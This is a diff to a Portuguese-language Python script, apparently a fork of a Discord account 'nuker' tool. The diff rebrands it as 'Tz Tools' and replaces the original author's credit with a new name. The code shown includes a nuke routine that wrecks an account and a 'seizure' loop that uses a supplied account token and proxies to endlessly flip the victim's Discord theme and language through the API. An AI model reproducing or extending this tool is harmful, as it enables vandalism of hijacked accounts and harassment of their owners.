@@ -1,6 +1,6 @@
-# Esse self foi orgulhosamente codificado por Rdimo (https://instagram.com/tzfofo).
+# Esse self foi orgulhosamente codificado por Tz (https://instagram.com/tzfofo).
 # Copyright (c) 2021 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo
-# Tz Nuker sob a Licença Pública Geral GNU v2 (1991).
+# Tz Tools sob a Licença Pública Geral GNU v2 (1991).
 
 import threading
 import requests
@@ -95,13 +95,13 @@ def Tz_Nuke(token, Server_Name, message_Content):
     SlowPrint(f"{Fore.GREEN}Transformado com sucesso {a} em um terreno baldio perigoso ")
     print("Digite qualquer coisa para continuar. . . ", end="")
     input()
-    Hazard.main()
+    Tz.main()
 
 def CustomSeizure(token):
     print(f'{Fore.MAGENTA}Iniciando o modo de apreensão {Fore.RESET}{Fore.WHITE}(Ligar/desligar o modo claro/escuro){Fore.RESET}\n')
     t = threading.currentThread()
     while getattr(t, "do_run", True):
         modes = cycle(["light", "dark"])
-        #cycle between light/dark mode and languages
+        #ciclo entre modo claro/escuro e idiomas
         setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
         requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"http": f'{proxy()}'}, headers=getheaders(token), json=setting)
